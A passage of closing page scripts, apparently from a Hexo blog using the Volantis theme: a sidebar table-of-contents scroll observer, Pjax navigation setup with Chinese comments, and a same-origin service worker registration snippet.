        entry = entries[index];
      } else {
        return sections.indexOf(entry.target);
      }
    }
    return sections.indexOf(entry.target);
  }

  function createIntersectionObserver(marginTop) {
    marginTop = Math.floor(marginTop + 10000);
    let intersectionObserver = new IntersectionObserver(
      (entries, observe) => {
        let scrollHeight = document.documentElement.scrollHeight + 100;
        if (scrollHeight > marginTop) {
          observe.disconnect();
          createIntersectionObserver(scrollHeight);
          return;
        }
        let index = findIndex(entries);
        activateNavByIndex(navItems[index]);
      },
      {
        rootMargin: marginTop + "px 0px -100% 0px",
        threshold: 0,
      }
    );
    sections.forEach((element) => {
      element && intersectionObserver.observe(element);
    });
  }
  createIntersectionObserver(document.documentElement.scrollHeight);
}

document.addEventListener("DOMContentLoaded", listennSidebarTOC);
document.addEventListener("pjax:success", listennSidebarTOC);
</script>

<!-- more -->

 
	   
	    


<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>


<script>
    var pjax;
    document.addEventListener('DOMContentLoaded', function () {
      pjax = new Pjax({
        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
        selectors: [
          "title",
          
          "#pjax-container",
          "#pjax-header-nav-list"
        ],
        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
        timeout: 5000
      });
    });

    document.addEventListener('pjax:send', function (e) {
      //window.stop(); // 相当于点击了浏览器的停止按钮

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      window.subData = null; // 移除标题（用于一二级导航栏切换处）

      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航

      // 解绑事件 避免重复监听
      volantis.$topBtn.unbind('click');
      $('.menu a').unbind('click');
      $(window).unbind('resize');
      $(window).unbind('scroll');
      $(document).unbind('scroll');
      $(document).unbind('click');
      $('body').unbind('click');
	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
	  volantis.pjax.method.send.start();
    });

    document.addEventListener('pjax:complete', function () {
      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
      $('script[data-pjax], .pjax-reload script').each(function () {
        $(this).parent().append($(this).remove());
      });
      try{
		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
		volantis.pjax.method.complete.start();
      } catch (e) {
        console.log(e);
      }
    });

    document.addEventListener('pjax:error', function (e) {
	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
	  volantis.pjax.method.error.start();
      window.location.href = e.triggerElement.href;
    });
</script>
 
	  
    </div>
  <script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>